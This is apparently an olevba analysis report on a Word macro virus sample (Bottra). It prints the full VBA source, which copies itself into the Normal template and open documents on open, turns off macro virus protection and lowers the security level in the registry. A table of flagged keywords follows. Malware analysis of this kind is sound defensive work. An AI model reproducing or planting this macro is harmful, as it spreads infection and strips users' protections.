olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bottra-ff1c1570ece1c50598067b13ae76de4661e0d376
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bottra-ff1c1570ece1c50598067b13ae76de4661e0d376 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

End Sub

Private Sub Document_Open()
    On Error Resume Next
    Dim ThisDoc, NTmp As Object
    Dim MyCode As String
    Set ThisDoc = ThisDocument.VBProject.VBComponents.Item(1).codemodule
    Set NTmp = NormalTemplate.VBProject.VBComponents.Item(1).codemodule
    Set aDOC = ActiveDocument.VBProject.VBComponents.Item(1).codemodule
    
    TCode = NTmp.CountOfLines
    ACode = aDOC.CountOfLines
    
    MyCode = ThisDoc.Lines(1, ThisDoc.CountOfLines)
    Open "c:\tk.mxc" For Output As #1
        Print #1, "Attribute VB_Name=""ThisDocument"""
        Print #1, MyCode
    Close #1
    
    NTmp.deletelines 1, TCode
    NTmp.AddFromFile "c:\tk.mxc"
    
    aDOC.deletelines 1, ACode
    aDOC.AddFromFile "c:\tk.mxc"
    
    ActiveDocument.Saved = False
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    
    ShowVisualBasicEditor = False 'CommandBars("Tools").Controls("Macro").Enabled = False
    Application.EnableCancelKey = wdCancelDisabled
    With Options: .SaveNormalPrompt = False: .VirusProtection = False: .SavePropertiesPrompt = False: End With
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\9.0\Word\Security", "Level") = 1
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

